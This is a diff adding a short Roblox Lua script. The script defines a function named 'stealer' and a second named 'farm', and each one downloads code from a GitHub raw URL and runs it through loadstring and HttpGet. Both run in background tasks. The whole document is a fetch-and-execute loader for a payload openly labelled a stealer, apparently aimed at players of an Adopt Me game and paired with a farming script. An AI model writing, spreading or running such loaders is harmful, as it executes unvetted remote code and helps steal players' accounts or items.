@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DAZDADAZD/adoptpre/refs/heads/main/zebHUBV2'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DAZDADAZD/virtual-adopt-me/refs/heads/main/fef'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
